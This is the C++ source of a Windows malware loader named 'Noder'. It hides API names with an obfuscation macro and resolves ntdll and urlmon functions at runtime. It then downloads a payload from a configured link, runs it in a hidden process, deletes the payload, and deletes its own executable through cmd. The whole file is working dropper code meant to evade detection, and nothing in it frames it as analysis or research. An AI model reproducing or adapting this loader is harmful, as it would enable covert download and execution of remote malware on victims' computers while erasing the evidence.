#include <iostream>
#include <filesystem>
#include <windows.h>

#include "obfuscation.h"
#include "definitions.h"
#include "config.h"
#include "utils.h"

#include "noder.h"

Noder::Noder() 
{
	this->Init();

	if (!this->LoadLibraries())
		return;

	if (!this->LoadFunctions())
		return;

	if (!this->DownloadPayload())
		return;

	this->ExecutePayload();
}

Noder::~Noder() 
{
	if (this->LdrUnloadDll == NULL)
		return;

	this->LdrUnloadDll(this->urlmon);
	this->LdrUnloadDll(this->ntdll);
}

void Noder::Init() noexcept
{
	this->LdrLoadDll = NULL;
	this->LdrUnloadDll = NULL;
	this->LdrGetProcedureAddressForCaller = NULL;
	this->RtlInitUnicodeString = NULL;
	this->RtlInitAnsiString = NULL;
	this->URLDownloadToFileW = NULL;

	this->ntdll = NULL;
	this->urlmon = NULL;

	//
	// Set payload name and path
	//
	std::wstring tempName = L"\\??\\"; // This path is used by Nt functions, hence this line
	tempName.append(std::filesystem::current_path());
	tempName.append(L"\\");

	if (config::randompayloadname)
		tempName.append(utils::RandomString());
	else
		tempName.append(PAYLOAD_NAME);

	tempName.append(PAYLOAD_FILE_EXTENSION);

	this->destination = tempName;
}

bool Noder::LoadLibraries() noexcept
{
	HMODULE tempNtdll = (HMODULE)GetModuleHandleW(OBF(wchar_t, L"ntdll.dll"));

	f_LdrLoadDll tempLdrLoadDll = (f_LdrLoadDll)GetProcAddress(tempNtdll, OBF(char, "LdrLoadDll"));
	f_RtlInitUnicodeString tempRtlInitUnicodeString = (f_RtlInitUnicodeString)GetProcAddress(tempNtdll, OBF(char, "RtlInitUnicodeString"));

	UNICODE_STRING usTemp;
	tempRtlInitUnicodeString(&usTemp, (PWSTR)OBF(wchar_t, L"ntdll.dll"));
	HMODULE hTemp;

	if (tempLdrLoadDll(NULL, 0x0, &usTemp, &hTemp) != 0x0)
	{
		return false;
	}
	this->ntdll = hTemp;

	tempRtlInitUnicodeString(&usTemp, (PWSTR)OBF(wchar_t, L"urlmon.dll"));
	if (tempLdrLoadDll(NULL, 0x0, &usTemp, &hTemp) != 0x0)
	{
		return false;
	}
	this->urlmon = hTemp;

	return true;
}

bool Noder::LoadFunctions() noexcept 
{
	this->LdrUnloadDll = (f_LdrUnloadDll)GetProcAddress(this->ntdll, OBF(char, "LdrUnloadDll"));
	if (this->LdrUnloadDll == NULL)
		return false;

	this->NtDeleteFile = (f_NtDeleteFile)GetProcAddress(this->ntdll, OBF(char, "NtDeleteFile"));
	if (this->NtDeleteFile == NULL)
		return false;

	this->RtlInitUnicodeString = (f_RtlInitUnicodeString)GetProcAddress(this->ntdll, OBF(char, "RtlInitUnicodeString"));
	if (this->RtlInitUnicodeString == NULL)
		return false;

	this->URLDownloadToFileW = (f_URLDownloadToFileW)GetProcAddress(this->urlmon, OBF(char, "URLDownloadToFileW"));
	if (this->URLDownloadToFileW == NULL)
		return false;



	return true;
}

bool Noder::DownloadPayload() noexcept
{
	return (this->URLDownloadToFileW(NULL, PAYLOAD_LINK, this->destination.c_str(), 0, NULL)) == S_OK;
}

void Noder::ExecutePayload() noexcept
{
	PROCESS_INFORMATION pi;
	STARTUPINFOW si;

	RtlZeroMemory(&si, sizeof(si));
	si.cb = sizeof(si);
	RtlZeroMemory(&pi, sizeof(pi));
	si.dwFlags = SW_HIDE;

	if (CreateProcessW(
		this->destination.c_str(),
		NULL,
		NULL,
		NULL,
		TRUE,
		0,
		NULL,
		NULL,
		&si,
		&pi
	))
	{
		WaitForSingleObject(pi.hProcess, INFINITE);

		CloseHandle(pi.hProcess);
		CloseHandle(pi.hThread);
	}

	
	CleanUp();
}

void Noder::CleanUp() noexcept
{
	//
	// Delete the (hopefully) executed payload
	//
	if (config::deletepayload)
	{
		UNICODE_STRING usName;
		this->RtlInitUnicodeString(&usName, PWSTR(this->destination.c_str()));

		OBJECT_ATTRIBUTES objAttr;

		objAttr.Length = sizeof(OBJECT_ATTRIBUTES);
		objAttr.RootDirectory = NULL;
		objAttr.ObjectName = &usName;
		objAttr.Attributes = 0x0;
		objAttr.SecurityDescriptor = NULL;
		objAttr.SecurityQualityOfService = NULL;

		NTSTATUS status = NtDeleteFile(&objAttr);
	}

	//
	// Delete the loader
	// *VERY* bad way of selfdeleting, we want to avoid ShellExecute
	//
	if (config::selfedelete)
	{
		wchar_t pathBuffer[MAX_PATH];
		GetModuleFileNameW(NULL, pathBuffer, MAX_PATH);

		std::wstring cmd(OBF(wchar_t, L"/c del "));
		cmd.append(pathBuffer);
		cmd.append(OBF(wchar_t, L" >> NUL"));

		wchar_t file[MAX_PATH];
		if (!GetEnvironmentVariableW(OBF(wchar_t, L"ComSpec"), file, MAX_PATH))
			return;

		ShellExecuteW(0, 0, file, cmd.c_str(), 0, SW_HIDE);
	}
}